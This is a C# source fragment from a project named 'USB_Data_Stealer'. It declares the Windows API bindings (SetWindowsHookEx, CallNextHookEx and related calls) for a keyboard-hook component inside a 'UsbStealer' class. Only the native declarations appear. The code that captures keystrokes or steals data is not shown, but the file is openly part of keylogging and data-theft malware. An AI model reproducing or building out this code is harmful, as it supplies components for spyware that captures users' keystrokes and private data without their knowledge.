using System;
using System.Runtime.InteropServices;

namespace USB_Data_Stealer.Core
{
    partial class UsbStealer
    {
        private partial class KeyboardHook
        {
            private static class NativeMethods
            {
                [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                public static extern IntPtr SetWindowsHookEx(int idHook,
                    LowLevelKeyboardProc lpfn, IntPtr hMod,
                    uint dwThreadId);

                [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                [return: MarshalAs(UnmanagedType.Bool)]
                public static extern bool UnhookWindowsHookEx(IntPtr hhk);

                [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

                [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                public static extern IntPtr GetModuleHandle(string lpModuleName);
            }
        }
    }
}